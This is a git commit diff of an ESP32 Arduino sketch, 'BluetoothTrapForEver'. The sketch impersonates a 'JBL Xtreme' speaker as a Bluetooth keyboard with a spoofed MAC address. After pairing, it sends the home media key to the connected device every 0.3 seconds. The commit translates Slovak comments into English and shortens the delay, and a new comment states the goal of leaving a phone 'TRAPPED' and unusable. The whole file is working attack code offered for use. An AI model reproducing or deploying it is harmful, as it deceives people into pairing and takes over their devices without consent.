04abefddbf8de3d6493fc4213cd6366de4d99b8f
Fattcat - but not fat cat <109801079+Fattcat@users.noreply.github.com>
2025-01-16 21:33:13 +0100

    Update BluetoothTrapForEver.ino

--- BluetoothTrapForEver.ino
+++ BluetoothTrapForEver.ino
@@ -3,14 +3,14 @@
 // BLE Keyboard
 BleKeyboard bleKeyboard("JBL Xtreme", "Custom Manufacturer", 100);
 
-// Vlastná MAC adresa
+// Set HERE YOUR MAC address
 const uint8_t customMacAddr[] = {0xF4, 0xF3, 0xAA, 0x07, 0xE4, 0xF2};
 
 void setup() {
   Serial.begin(115200);
   Serial.println("Starting BLE work!");
 
-  // Nastavenie vlastnej MAC adresy
+  // set ! CUSTOM MAC ADDRESS !
   esp_base_mac_addr_set(customMacAddr);
   Serial.print("Vlastná MAC adresa nastavená na: ");
   for (int i = 0; i < 6; i++) {
@@ -19,21 +19,22 @@ void setup() {
   }
   Serial.println();
 
-  // Inicializácia BLE Keyboard
+  // Initialize BLE Keyboard
   bleKeyboard.begin();
 }
 
 void loop() {
-  // Skontrolujeme, či je zariadenie pripojené
+  // Check if is device connected (sometimes send message but isnt actually connected)
   if (bleKeyboard.isConnected()) {
     Serial.println("BLE zariadenie pripojené!");
 
-    // Odoslanie mediálneho tlačidla WWW_HOME
+    // Send Medial button WWW_HOME
     Serial.println("Odosielam tlačidlo: WWW_HOME");
     bleKeyboard.write(KEY_MEDIA_WWW_HOME);
 
-    // Počkajte 5 sekúnd pred ďalším odoslaním
-    delay(600);
+    // SEND KEYSTROKE EVERY 0.3 Seconds
+    // Ensures now will be phone (or connected device TRAPPED and cannot use phone enymore) 
+    delay(300);
   } else {
     Serial.println("Čakám na pripojenie BLE zariadenia...");
   }
